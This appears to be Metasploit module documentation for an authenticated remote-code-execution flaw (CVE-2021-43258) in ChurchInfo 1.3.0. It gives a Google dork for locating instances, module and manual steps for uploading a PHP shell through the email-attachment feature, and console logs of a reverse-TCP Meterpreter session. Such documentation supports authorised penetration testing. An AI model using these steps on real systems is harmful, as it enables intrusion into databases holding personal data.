ChurchInfo is a PHP application used to help Churches manage systems and users as an opensource project. There are various vulnerabilities in the ChurchInfo 1.3.0 software which can be exploited by an attacker, this module targets an authenticated remote code execution (RCE) vulnerability.

ChurchInfo 1.3.0 has functionality to email users from the database with attachments. When preparing the email, the attachment draft is saved in the `/churchinfo/tmp_attach/` folder. Before the email is sent, the file put into the attachment can be loaded in the application. RCE exists when uploading malicious PHP as an attachment.

This vulnerability was assigned CVE-2021-43258.

## Vulnerable Application

* Project Homepage: http://www.churchdb.org/
* Project Download: https://sourceforge.net/projects/churchinfo/files/
* Google Dork: `intitle:"ChurchInfo: Login"`

Installation guides are available on the SourceForge site and within the zip file downloaded in the `./Documentation` folder. This is a standard PHP and MySQL website.

## Verification Steps
This module requires authenticated access to the application. After identifying a vulnerable ChurchInfo application, there MUST be persons available within the database. If there are no persons, a draft email cannot be made which is used to place the malicious attachment into the `/tmp_attach` directory for our exploit.

### Module Use
The following steps outline how to use the module.
1. Install the application and register an account.
2. Create some persons within the database, validate they populate at the page `/SelectList.php?mode=person`.
3. Within `msfconsole`, use the `exploits/multi/http/churchinfo_upload_exec` module.
4. Set the target `RHOST`, `APPBASE`, `username`, and `password` values. 
5. Select the payload of choice or leave default.
6. Set the `LHOST` to your system.
7. Run the exploit with `run`, enjoy the shell!

If exploit was successful, output should be something close to the following:

```
msf6 exploit(multi/http/churchinfo_upload_exec) > run

[*] Started reverse TCP handler on 192.168.1.240:4444
[+] Logged into application as admin
[*] Navigating to add items to cart
[+] Items in Cart: 3
[+] Uploading exploit via Email temp email attachment
[+] Exploit uploaded to /churchinfo/tmp_attach/FjuIxnXKe.php
[!] Don't forget to clean up artifacts at /churchinfo/tmp_attach/FjuIxnXKe.php
[*] Sending stage (39927 bytes) to 192.168.1.72
[*] Meterpreter session 2 opened (192.168.1.240:4444 -> 192.168.1.72:37250) at 2022-11-12 21:38:30 -0500

meterpreter >
```

### Manual Exploitation
The following steps outline how to manually exploit the vulnerability.
1. Log into the ChurchInfo application 
2. Browse to the `SelectList.php` page and click the "Add to Cart" button
3. Browse to `CartView.php` and click "Compose Email"
4. Attach a PHP shell as the "attach file", place anything in the subject and message, click "Save Email"
5. Navigate to `http://127.0.0.1/churchinfo/tmp_attach/exploit.php?cmd=pwd`
6. Any PHP code is executed


## Options
There are a handful of options which can be used to further configure the attack or other environmental uses.


### USERNAME

The username of a valid user account for the ChurchInfo application.

### PASSWORD

The password for a valid user account for the ChurchInfo application.

### APPBASE

The base directory path to the ChurchInfo application. This can and will likely vary depending on how the application was installed. Default value is `/churchinfo/`.

### EMAIL_SUBJ

The subject of the draft email used for the exploit, the email is not sent. Default value is `Exploit Subj`.

### EMAIL_MESG

The message on the draft email which is used for the exploit. The email is not sent. Default value is `Here's a lovely message`.

## Scenarios
If there are no persons in the database, the exploit will fail. To help troubleshoot, enable verbose mode with the following:

```
set verbose true
```
This will enable additional information and details about the exploit as it is launched. Verbose output will appear as similar to below:

```
msf6 exploit(multi/http/churchinfo_upload_exec) > run

[*] Started reverse TCP handler on 192.168.1.240:4444
[*] Gathering PHP session cookie
[*] SSL is false, leaving Proto parameter as http
[*] Login page is /churchinfo/Default.php?Proto=http&Path=192.168.1.72:80%2F/churchinfo/
[+] PHP session cookie is PHPSESSID=nq9q5dod5ggauohv5ob6j4s40e;
[*] Attempting login
[+] Logged into application as admin
[*] Attempting exploit
[*] Navigating to add items to cart
[+] Items in Cart: 3
[+] Uploading exploit via Email temp email attachment
[*] Payload name is GhVRHMKRJT.php
[*] Payload added to post_data
[*] Subject added to post_data
[*] emailmessage added to post_data
[*] submit added to post_data
[+] Exploit uploaded to /churchinfo/tmp_attach/GhVRHMKRJT.php
[!] Don't forget to clean up artifacts at /churchinfo/tmp_attach/GhVRHMKRJT.php
[*] Sending stage (39927 bytes) to 192.168.1.72
[*] Meterpreter session 3 opened (192.168.1.240:4444 -> 192.168.1.72:37252) at 2022-11-12 21:56:37 -0500

meterpreter >
```